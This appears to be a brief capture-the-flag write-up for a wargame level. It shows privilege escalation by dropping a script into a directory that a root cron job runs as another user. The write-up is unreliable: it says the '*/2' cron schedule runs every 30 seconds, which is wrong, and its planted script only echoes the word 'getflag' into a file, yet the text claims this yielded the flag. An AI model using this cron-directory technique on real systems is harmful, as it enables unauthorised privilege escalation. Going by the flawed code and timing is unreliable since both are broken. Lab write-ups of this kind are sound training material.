# This time after we logged in! we received a mail
# We checked the mail: cat /var/mail/level05

# We found:
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

# It's a cron table that execute the script openarenaserver every 30s

# We checked the script, and found that he execute shell scripts in the directory:
/opt/openarenaserver/

# Create an empty file
touch /tmp/flag

# We created a script in this directory to let the main script programmed by the crontab execute 'getflag' command
# Script:
#==================================================
    #!/bin/sh

    echo getflag > /tmp/flag
#==================================================


# After 30s we got the flag in the file: /tmp/flag